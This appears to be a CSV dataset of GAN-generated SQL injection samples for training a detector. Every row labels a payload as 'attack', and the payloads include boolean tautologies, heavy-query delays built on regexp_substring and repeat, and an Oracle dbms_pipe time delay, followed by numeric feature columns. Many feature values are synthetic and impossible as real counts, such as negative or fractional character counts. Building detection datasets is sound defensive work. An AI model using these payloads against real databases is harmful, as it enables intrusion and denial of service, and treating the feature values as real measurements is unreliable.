id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001177,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.51450609335919,167.37705993652344,7.464870929718018,40.77176284790039,81.96918487548828,0.09962262213230133,28.422801971435547,27.834590911865234,1.7756266593933105,0.167631134390831,0.17682036757469177,0.41674908995628357,0.11879397928714752,3.2009940147399902,2.368596076965332,-0.2595828175544739,0.3600471019744873,0.2015066146850586,0.2485969513654709,-0.0726383849978447,5.151179313659668,10.67243480682373,2.5104031562805176,-0.02514323964715004,1.7763360738754272,0.20395083725452423,-0.027183309197425842,0.8005516529083252,0.3838237226009369,0.45168638229370117,-0.02164594456553459,0.07595556229352951,-0.12462101876735687,1.0692886114120483,0.35304391384124756,2.507572650909424,6.220411777496338,0.7006111145019531,0.6805819272994995,0.2558010518550873,0.8389074206352234,-0.33780959248542786,-0.1965349316596985,-0.4820922613143921,0.9485446810722351,0.5956446528434753,0.5071837306022644,0.23380687832832336,0.0024112092796713114,0.23356829583644867,0.4927065372467041,0.13035354018211365,0.8018203973770142,-0.10645636916160583,0.5218521356582642,-0.49316614866256714,0.03888466954231262,-0.5302364826202393,0.7365972399711609,0.04598241671919823,-0.6664398908615112,-0.196553036570549,-0.2541620135307312,5.931070804595947,-0.19843003153800964,0.0657084733247757,-0.02979840338230133,0.2264856994152069,0.6382347941398621,0.6176945567131042,0.001227792352437973,0.7901465892791748,0.3287755846977234,0.033728744834661484,0.2974625825881958,-0.5125591158866882,0.5615204572677612,0.49640506505966187,0.42526954412460327,0.019022071734070778,-0.08270040154457092,11.882425308227539,0.9127321243286133,0.8200445175170898,0.5035399198532104,-0.4864737093448639,0.6569784283638,0.5249096751213074,0.014199809171259403
GAN_001178,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.028214135314328,186.82757568359375,10.322029113769531,33.61671447753906,51.92878723144531,0.05176154896616936,29.453004837036133,25.981407165527344,1.391688585281372,0.1997670829296112,0.1842712163925171,0.3976891040802002,0.13467885553836823,3.47644305229187,2.1756508350372314,-0.07581742107868195,0.21044717729091644,0.17484304308891296,0.3269931375980377,0.25268495082855225,2.5336246490478516,6.6901469230651855,2.339690685272217,-0.023487702012062073,1.684920072555542,0.3092123568058014,-0.028567131608724594,0.5249388813972473,0.3419646918773651,0.26482120156288147,-0.04031553864479065,0.02263132482767105,-0.04521573707461357,0.52170330286026,0.37587472796440125,2.292459726333618,4.974637508392334,0.7413051724433899,0.6909582614898682,0.33957964181900024,0.5728415846824646,-0.14356257021427155,-0.11316175013780594,-0.5371084809303284,0.4364541172981262,0.7782222628593445,0.6101075410842896,0.1412242352962494,-0.13405774533748627,0.07166111469268799,0.27452054619789124,0.05937831848859787,0.6856246590614319,-0.2308633029460907,0.22350259125232697,-0.48527956008911133,0.018896952271461487,-0.6204159259796143,0.4957764148712158,0.24007736146450043,-0.905939519405365,0.04595078155398369,0.06231890618801117,2.8988611698150635,-0.36608314514160156,0.032826248556375504,0.0013185114366933703,0.28617191314697266,0.2626051604747772,0.45130857825279236,0.04835248738527298,0.623894453048706,-0.05535130202770233,-0.009411928243935108,0.04180481284856796,-0.33823323249816895,0.7476634979248047,0.5888298749923706,0.34561553597450256,0.006904535926878452,-0.18671171367168427,9.55295181274414,0.9945005774497986,0.32651373744010925,0.28172844648361206,-0.07327938824892044,0.4728073477745056,0.5796017050743103,0.038987960666418076
GAN_001179,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,8.384017157965761,202.99058532714844,-15.44924545288086,48.159759521484375,96.65573120117188,0.0970740094780922,20.5756893157959,28.01725959777832,2.134768009185791,0.13788628578186035,0.19752879440784454,0.4221007525920868,0.1076258197426796,3.0076913833618164,3.3689489364624023,-0.5589236617088318,0.22072796523571014,0.30167829990386963,0.31505194306373596,-0.052770715206861496,3.394928216934204,13.401004791259766,2.457580089569092,-0.021976599469780922,1.768779993057251,0.4252787232398987,-0.03638358414173126,1.0636191368103027,0.4952642023563385,0.5518550276756287,-0.011612595990300179,0.01139737293124199,-0.2670567035675049,1.26997971534729,0.45126262307167053,2.6714580059051514,6.653958320617676,0.36195671558380127,0.5670140981674194,0.49696847796440125,0.9869745373725891,-0.48080846667289734,0.020576374605298042,-0.6051763892173767,1.3846255540847778,1.0728602409362793,0.3322938084602356,0.3662109375,-0.08973520249128342,0.39519038796424866,0.49129778146743774,0.19895629584789276,0.9672459959983826,-0.10702461749315262,0.7697478532791138,-0.5886290073394775,0.05937423184514046,-0.8764400482177734,1.0522162914276123,-0.2815922200679779,-0.9315231442451477,0.20537817478179932,-0.3845001757144928,5.761552810668945,-0.11988288164138794,0.05733121931552887,-0.050491057336330414,0.39399176836013794,0.5100052952766418,0.8759113550186157,-0.04307384416460991,0.9656098484992981,0.3488844037055969,0.033628419041633606,0.6590904593467712,-0.75966477394104,0.45094043016433716,0.28323689103126526,0.6812825202941895,-0.004913634620606899,0.027548784390091896,12.256418228149414,0.9259385466575623,1.397682547569275,0.49517783522605896,-0.45299962162971497,1.1389743089675903,1.0884928703308105,0.029003866016864777
GAN_001180,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,4.940052254352873,192.416015625,35.571720123291016,33.48382568359375,69.07937622070312,0.015176162123680115,50.77871322631836,28.454038619995117,1.430181622505188,0.29263484477996826,0.1574094295501709,0.38341739773750305,0.13217675685882568,3.4409797191619873,2.3803093433380127,0.28632503747940063,0.41312265396118164,0.12216730415821075,0.11105620115995407,0.037427280098199844,4.830245018005371,8.172266006469727,2.791414499282837,-0.013900775462388992,1.6366586685180664,0.18147407472133636,-0.03421327844262123,0.6393965482711792,0.6865373849868774,0.41240328550338745,-0.011329572647809982,0.11964676529169083,-0.13210532069206238,0.7104750871658325,0.34568604826927185,2.172039270401001,5.289433479309082,0.6096186637878418,0.7534993290901184,0.006702926009893417,0.7771320939064026,0.05374453589320183,-0.29691892862319946,-0.19767352938652039,0.48786574602127075,0.6094051003456116,0.5492409467697144,0.20988965034484863,0.0005180315929464996,0.24330377578735352,0.33634477853775024,0.17500950396060944,0.28931528329849243,-0.02299824357032776,0.6120478510856628,-0.22867031395435333,0.00484455144032836,-0.17038965225219727,0.6945827007293701,0.21879354119300842,-0.47806721925735474,0.0649975910782814,-0.23908041417598724,3.6063828468322754,-0.1346765011548996,0.043884675949811935,-0.03266799822449684,0.17486266791820526,0.43538036942481995,0.19150087237358093,-0.15739209949970245,0.4658154249191284,0.0327933207154274,0.01693231239914894,0.20427677035331726,-0.3451686501502991,0.5371244549751282,0.41355520486831665,0.32481813430786133,0.04512956738471985,-0.1568271666765213,9.354693412780762,0.8966791033744812,0.47821977734565735,0.5857507586479187,-0.04762490838766098,0.11682692170143127,0.22477023303508759,0.02985036000609398
GAN_001181,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.7804513735933,182.72312927246094,-11.35531234741211,42.41622543334961,64.42079162597656,0.12968742847442627,18.4766788482666,31.39597511291504,1.8466829061508179,0.14057102799415588,0.22763213515281677,0.43211427330970764,0.13402241468429565,3.126595973968506,2.2276952266693115,-0.5389533638954163,0.2829205393791199,0.24841490387916565,0.36924806237220764,0.2831307053565979,1.7265751361846924,8.977148056030273,2.576270818710327,-0.024970795959234238,1.6586564779281616,0.693618655204773,-0.04183175787329674,0.8156989216804504,0.4624539017677307,0.140131413936615,-0.0398017019033432,-0.09388230741024017,-0.09792429208755493,0.9700025320053101,0.20975624024868011,2.7203280925750732,6.854928016662598,0.8034800291061401,0.6633772850036621,0.25531625747680664,0.9517122507095337,-0.31397971510887146,-0.24126052856445312,-0.7235812544822693,0.5756580829620361,0.8673995137214661,0.9882113337516785,0.21980798244476318,-0.15342654287815094,0.12841632962226868,0.3943973779678345,0.09620595723390579,0.6391076445579529,-0.5036646723747253,0.3945050537586212,-0.670041024684906,0.035608649253845215,-0.7778841257095337,0.6640570163726807,0.23098552227020264,-1.1126019954681396,0.0926373228430748,0.035707712173461914,4.206060886383057,-0.5723921060562134,0.05428088828921318,-0.032312776893377304,0.5478336811065674,0.45359259843826294,0.4930958151817322,0.22406481206417084,0.9342163801193237,0.1088954508304596,0.027071543037891388,0.3489457368850708,-0.4629518389701843,0.6225231885910034,0.6270062923431396,0.3804861307144165,0.09608889371156693,-0.2900741696357727,10.585539817810059,0.9706272482872009,0.5445010662078857,0.5954298377037048,-0.15628033876419067,0.7332763671875,0.7081478238105774,0.024154704064130783
GAN_001182,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.945115736450892,203.28201293945312,3.5195047855377197,42.528018951416016,30.429391860961914,0.0645972415804863,37.114192962646484,27.028850555419922,1.3232719898223877,0.23288847506046295,0.1529354751110077,0.421735554933548,0.10992154479026794,3.3190736770629883,3.0349655151367188,0.10676608979701996,-0.4142325520515442,0.20581285655498505,0.3743913471698761,0.505641758441925,4.148418426513672,6.514883041381836,3.3997464179992676,-0.06662280112504959,1.9220627546310425,0.48392054438591003,-0.05098208785057068,0.3780538737773895,1.0296545028686523,0.4252113699913025,-0.08194617182016373,-0.03843148052692413,-0.09600074589252472,1.1800884008407593,0.22235049307346344,2.789214611053467,4.097742557525635,0.8274710774421692,0.6103488802909851,0.337655246257782,0.7957907915115356,-0.3406660854816437,-0.4822060167789459,-0.7543911337852478,0.6282929182052612,0.9244651794433594,1.4644533395767212,0.0015809910837560892,-0.1461458057165146,-0.029375113546848297,0.42589759826660156,0.030358240008354187,0.86905437707901,-0.46690431237220764,0.36194244027137756,-0.25793102383613586,0.008072763681411743,-0.7818495631217957,1.0319929122924805,0.5061691999435425,-1.7003434896469116,0.013262450695037842,-0.09744030982255936,4.211856365203857,-0.5789796710014343,0.08466976135969162,-0.04139239341020584,0.37036624550819397,0.7725597620010376,0.42692670226097107,-0.10557196289300919,0.8691407442092896,0.03670935332775116,-0.009146385826170444,0.22085615992546082,-0.6328140497207642,0.7262588143348694,0.47124478220939636,1.0609371662139893,-0.07886091619729996,-0.1272883266210556,12.39997673034668,0.9046518802642822,0.43333038687705994,0.8549580574035645,-0.12960147857666016,0.2528156638145447,0.5514702796936035,0.05127581208944321
GAN_001183,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000124,4.822999081022474,198.8143768310547,30.64354133605957,28.875545501708984,57.827632904052734,0.05740797147154808,52.86909866333008,24.00425910949707,1.4107353687286377,0.2984490394592285,0.1717773675918579,0.3911271393299103,0.12839068472385406,3.4021503925323486,2.4207382202148438,0.06719212234020233,0.7513960599899292,0.05432436987757683,0.19144262373447418,0.3564702272415161,3.497844934463501,8.108484268188477,2.7214455604553223,-0.005931044463068247,1.632336974143982,0.2748155891895294,-0.018798941746354103,0.6922104358673096,0.6940250992774963,0.5344162583351135,-0.009482942521572113,-0.023788943886756897,-0.00469543831422925,0.5235050916671753,0.4332076907157898,2.020885705947876,5.521610736846924,0.5163530707359314,0.6268923282623291,0.12299257516860962,0.6854636669158936,0.15797241032123566,-0.2119581550359726,-0.2468128800392151,0.4808286428451538,0.5641682744026184,0.2557232677936554,0.19154097139835358,0.052578844130039215,0.1920519322156906,0.3069624900817871,0.12884020805358887,0.23229773342609406,0.0840381383895874,0.42394351959228516,-0.13723158836364746,0.009572189301252365,-0.29265835881233215,0.5384212732315063,-0.09998765587806702,-0.5511192083358765,0.06216054782271385,-0.1554785966873169,2.5260632038116455,-0.1663123071193695,0.03861831873655319,0.006219244562089443,0.19279980659484863,0.18038590252399445,0.313897043466568,-0.1627494990825653,0.13079524040222168,-0.021774401888251305,0.009893698617815971,0.3353949189186096,-0.4412170648574829,0.662097156047821,0.3869763910770416,0.40049853920936584,0.03774666786193848,-0.03436943143606186,8.62530517578125,0.8579173684120178,0.5822682976722717,0.5606160163879395,-0.13219180703163147,0.149419903755188,0.43150484561920166,0.015892628580331802
GAN_001184,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,8.527609111476238,179.88247680664062,-27.263591766357422,52.027748107910156,87.1138687133789,0.11880163848400116,8.22203254699707,32.028526306152344,1.9973069429397583,0.08185640722513199,0.19264984130859375,0.43694281578063965,0.11716823279857635,3.020988702774048,3.1804165840148926,-0.34991317987442017,-0.1406383067369461,0.3323672413825989,0.3170884847640991,0.009924156591296196,4.975571632385254,12.34201431274414,2.118968963623047,-0.04156333953142166,1.6776905059814453,0.38569068908691406,-0.054955579340457916,0.9333198666572571,0.21799029409885406,0.26058271527290344,-0.03133513405919075,-0.1320270448923111,-0.24138924479484558,1.323124885559082,0.31849926710128784,2.9997732639312744,6.338294506072998,0.653302788734436,0.675542414188385,0.6233701705932617,0.9446516036987305,-0.645118772983551,-0.0679532140493393,-0.7847065925598145,1.2788463830947876,0.9539493322372437,0.8155600428581238,0.23783540725708008,-0.2160254567861557,0.2411353588104248,0.43704816699028015,0.10750837624073029,0.9968968629837036,-0.6441660523414612,0.480259507894516,-0.8132558465003967,0.058414287865161896,-0.7788983583450317,0.863709032535553,0.19041548669338226,-1.1900838613510132,0.12223593145608902,-0.434825599193573,6.383480072021484,-0.3951127529144287,0.06044666841626167,-0.07168520241975784,0.30514368414878845,0.5373518466949463,0.9804869890213013,0.13311251997947693,1.3607394695281982,0.39142337441444397,0.01897159218788147,0.6126442551612854,-0.31274867057800293,0.2972896695137024,0.5008969902992249,0.5783771872520447,-0.05760779231786728,-0.06644238531589508,13.680309295654297,0.9557779431343079,1.12655508518219,0.5901949405670166,-0.3678538501262665,1.0666513442993164,0.8510992527008057,0.035076554864645004
GAN_001185,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.240925605477737,172.20408630371094,-22.18600845336914,46.39921569824219,51.71757125854492,0.0700162723660469,19.57210350036621,31.8321590423584,1.9105889797210693,0.12523284554481506,0.21725426614284515,0.43581342697143555,0.12442537397146225,3.037928819656372,2.7433204650878906,-0.3401406407356262,0.4077582359313965,0.25666773319244385,0.3195742666721344,0.1889285445213318,3.058840751647949,9.125073432922363,2.5696184635162354,-0.05157177150249481,1.6422104835510254,0.548728883266449,-0.050283677875995636,0.848757803440094,0.5920056104660034,0.20352262258529663,-0.04171378165483475,-0.12360472977161407,-0.18893679976463318,1.0762877464294434,0.26764562726020813,2.9096405506134033,6.102911472320557,0.7400915026664734,0.5682604908943176,0.4866504967212677,0.9716517925262451,-0.3419172465801239,-0.2728133499622345,-0.7589803338050842,0.8283437490463257,0.8597880601882935,0.9085238575935364,0.20462697744369507,-0.15603159368038177,0.23998786509037018,0.42562437057495117,0.1908690184354782,0.7172562479972839,-0.36608269810676575,0.5495234727859497,-0.535779595375061,0.028946304693818092,-0.6749740839004517,1.1330623626708984,0.1869339495897293,-0.9725862741470337,0.2341693937778473,-0.28499114513397217,4.536402225494385,-0.6933900713920593,0.0731169730424881,-0.05841391533613205,0.44833722710609436,0.3963986933231354,0.49649596214294434,0.16483266651630402,0.9684968590736389,0.10493998229503632,-0.019649924710392952,0.5345889329910278,-0.5271174907684326,0.427638441324234,0.47632163763046265,0.6182572841644287,0.06506241112947464,-0.24994629621505737,9.833353042602539,0.9300070405006409,0.5900461673736572,0.7972674369812012,-0.1939270794391632,0.8792656660079956,0.7452042102813721,0.033471908420324326
GAN_001186,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.934562414339828,207.92645263671875,6.159904956817627,38.49213790893555,55.718475341796875,0.06044701486825943,34.97614669799805,28.853473663330078,1.7317240238189697,0.20931696891784668,0.19637252390384674,0.40795958042144775,0.12367179244756699,3.284229278564453,2.2874488830566406,-0.4344704747200012,0.21788881719112396,0.1413222998380661,0.2866923213005066,0.450954794883728,3.233851909637451,6.787960529327393,2.70535945892334,-0.05829743295907974,1.8509496450424194,0.16536764800548553,-0.037412457168102264,0.6565645337104797,0.27750036120414734,0.34253111481666565,-0.025352738797664642,0.08869623392820358,-0.0967465341091156,1.0369609594345093,0.21260155737400055,2.6016647815704346,5.337634563446045,0.7518698573112488,0.5461587905883789,0.13178670406341553,0.8803203701972961,-0.15644587576389313,-0.5105818510055542,-0.6613225936889648,0.7897017598152161,1.0277296304702759,0.7161524891853333,0.16864711046218872,-0.0649678185582161,0.13468264043331146,0.4209030568599701,0.12014752626419067,0.5000362396240234,-0.08332383632659912,0.4770890474319458,-0.4113974869251251,0.0035619991831481457,-0.6657403111457825,1.0439032316207886,0.1055501326918602,-0.734858512878418,0.026944972574710846,-0.04946549981832504,3.3099746704101562,-0.4565771818161011,0.05323406681418419,-0.030877988785505295,0.3691936731338501,0.46957775950431824,0.3939621150493622,-0.14551721513271332,0.636143147945404,-0.028323816135525703,-0.03159984573721886,0.25147026777267456,-0.6036549806594849,0.5422597527503967,0.5632075071334839,0.5625912547111511,0.10814324766397476,-0.1336856633424759,9.664868354797363,0.9461992979049683,0.4459192156791687,0.6921300292015076,-0.2881488502025604,0.5602901577949524,0.6348055601119995,0.01967337355017662
GAN_001187,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,5.763105001692225,187.18788146972656,26.823266983032227,34.766483306884766,61.3541374206543,0.060884248465299606,44.38400650024414,27.968259811401367,1.4434798955917358,0.23995430767536163,0.19008176028728485,0.4156061112880707,0.12736406922340393,3.2170841693878174,2.1593005657196045,-0.3525800108909607,0.6035284996032715,0.10924248397350311,0.29372209310531616,0.4714336097240448,3.4792962074279785,9.453919410705566,3.139949321746826,-0.023053985089063644,1.8315587043762207,0.26886487007141113,-0.05366068333387375,0.7503210306167603,0.35188835859298706,0.282405823469162,-0.0343855619430542,-0.22426176071166992,-0.06574410945177078,0.7968569993972778,0.43520388007164,2.4461984634399414,6.617685317993164,0.7723739743232727,0.5907602310180664,0.25617867708206177,0.7756443023681641,-0.0693933293223381,-0.25343239307403564,-0.3634834289550781,0.6174315810203552,0.7457650899887085,0.3917962908744812,0.19766363501548767,-0.01578771322965622,0.1349078118801117,0.4662995934486389,0.1323031187057495,0.5032641291618347,-0.04483950138092041,0.500738799571991,-0.2748481035232544,0.0013825715286657214,-0.42327091097831726,0.630561888217926,0.1740599125623703,-0.6764512658119202,-0.0914222002029419,-0.23857031762599945,2.8805017471313477,-0.32567816972732544,0.015215817838907242,-0.012705233879387379,0.07513454556465149,0.4712822139263153,0.5337718725204468,-0.045827120542526245,0.5296974182128906,0.13791324198246002,-0.02047543041408062,0.28232383728027344,-0.40524548292160034,0.7809145450592041,0.4687265455722809,0.4633086919784546,0.16555659472942352,-0.21285875141620636,10.442214965820312,0.8673287034034729,0.5163953304290771,0.28276553750038147,-0.3448100984096527,0.3188111186027527,0.702785074710846,0.023529844358563423
GAN_001188,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.679284829544438,210.1580047607422,18.402862548828125,43.637813568115234,82.06466674804688,0.11739780753850937,40.41714859008789,31.404842376708984,1.6610212326049805,0.24514703452587128,0.15863405168056488,0.386625736951828,0.11181239783763885,3.2105255126953125,3.163278579711914,-0.20369453728199005,0.3646203279495239,0.16055770218372345,0.27461642026901245,0.2537097930908203,5.033449172973633,12.904276847839355,2.6127328872680664,-0.01856025867164135,1.6783885955810547,0.6827273964881897,-0.0426160953938961,0.7482866048812866,0.849651038646698,0.5689082741737366,-0.01262478157877922,-0.3102862238883972,-0.17792649567127228,1.3721767663955688,0.39400047063827515,2.5875864028930664,6.668515205383301,0.23285605013370514,0.5869571566581726,0.24002337455749512,0.9203615784645081,-0.2409306913614273,0.02433382160961628,-0.39809098839759827,0.838219940662384,0.5169124007225037,0.2638148367404938,0.30096206068992615,-0.0260169580578804,0.21438360214233398,0.5141924619674683,0.24539068341255188,0.6612004637718201,-0.407907098531723,0.5535080432891846,-0.27110183238983154,0.047667246311903,-0.5862087607383728,0.7487450838088989,0.003956682048738003,-1.1173604726791382,-0.05094647407531738,-0.6721006631851196,4.785398006439209,-0.12314336001873016,0.05160488188266754,-0.050147175788879395,0.1718641221523285,0.4047399163246155,0.9270933270454407,-0.17880329489707947,0.8069019913673401,0.16859032213687897,0.05432305857539177,0.5528838634490967,-0.5783373117446899,0.5170472264289856,0.2828509211540222,0.5218440890312195,0.010315337218344212,-0.15588711202144623,12.168346405029297,0.8053818941116333,1.0029023885726929,0.5627247095108032,-0.48503121733665466,0.5633054375648499,0.622822642326355,0.029132084921002388
GAN_001189,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,5.6632614626647415,179.5363311767578,24.907114028930664,36.54159164428711,76.11067199707031,0.10827203840017319,29.8140926361084,31.757129669189453,1.6640208959579468,0.22602543234825134,0.19558611512184143,0.4044346511363983,0.13074490427970886,3.2292957305908203,2.1847074031829834,-0.07161004841327667,0.5507795214653015,0.16684767603874207,0.1679411232471466,0.03372790664434433,5.363025188446045,11.379375457763672,2.3689372539520264,-0.010827237740159035,1.574724555015564,0.6398687958717346,-0.044223468750715256,0.9093354940414429,0.47333744168281555,0.2449602484703064,-0.00905013456940651,-0.04952161759138107,-0.17025287449359894,0.8533679246902466,0.28254860639572144,2.5374679565429688,7.762555122375488,0.7957931160926819,0.6550172567367554,-0.21660305559635162,0.9381346106529236,-0.14202387630939484,-0.2426580786705017,-0.37970852851867676,0.6341723203659058,0.4828166365623474,0.6674724221229553,0.26951730251312256,0.036789849400520325,0.23868632316589355,0.3960064947605133,0.2439614236354828,0.3944719731807709,-0.28955721855163574,0.731290876865387,-0.2899748384952545,0.021837996318936348,-0.2605837881565094,0.4967743158340454,0.11943545192480087,-0.5044617652893066,-0.0549369752407074,-0.4573254883289337,4.613708019256592,-0.21598151326179504,0.03445622697472572,-0.027815770357847214,0.1711064875125885,0.4618985950946808,0.3026317358016968,0.055781930685043335,0.5433831214904785,0.3713589012622833,0.052037108689546585,0.4866812825202942,-0.21479715406894684,0.5993449091911316,0.42537012696266174,0.28692758083343506,0.10072743892669678,-0.25728005170822144,10.246378898620605,0.7653862833976746,0.7437294125556946,0.5146784782409668,-0.27222102880477905,0.3821861147880554,0.3584660291671753,0.013492053374648094
GAN_001190,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.565472858719403,199.10986328125,4.455589771270752,39.757572174072266,59.07646179199219,0.12757951021194458,37.3838005065918,25.91238021850586,1.4641143083572388,0.2033468633890152,0.16428454220294952,0.4164585769176483,0.11292459815740585,3.2049286365509033,3.0874404907226562,0.022127436473965645,0.3389023542404175,0.23047395050525665,0.2739434540271759,0.37391290068626404,4.529818058013916,10.371609687805176,2.809163808822632,-0.049516163766384125,2.0679054260253906,0.3633749485015869,-0.0434514544904232,0.658596932888031,0.8641762137413025,0.46402570605278015,-0.033336132764816284,-0.31706497073173523,-0.15525485575199127,0.9476351737976074,0.5202475190162659,2.503127098083496,6.003056526184082,0.5728402733802795,0.5898208618164062,0.6151750683784485,0.7879519462585449,-0.24554480612277985,-0.15747879445552826,-0.3555436134338379,0.7135938405990601,0.7164536714553833,0.5868157148361206,0.1746099293231964,-0.07055655866861343,0.14808346331119537,0.3832858204841614,0.26833489537239075,0.5741174221038818,-0.39133286476135254,0.5268455743789673,-0.3355615437030792,0.0170990452170372,-0.5287260413169861,0.9462458491325378,-0.08761414885520935,-1.1380659341812134,0.2162003517150879,-0.4127545952796936,3.695762872695923,-0.5124399065971375,0.023813290521502495,-0.014623415656387806,0.09060423821210861,0.44554415345191956,0.4964585304260254,-0.21871568262577057,0.9175266623497009,0.38552558422088623,-0.03259611874818802,0.5893278121948242,-0.6336787343025208,0.6000721454620361,0.32692450284957886,0.8576155304908752,0.010240294970571995,0.21121852099895477,11.26263427734375,0.7794743776321411,0.6611161231994629,0.5681750774383545,-0.1785607635974884,0.5597498416900635,0.7417819499969482,0.038885556161403656
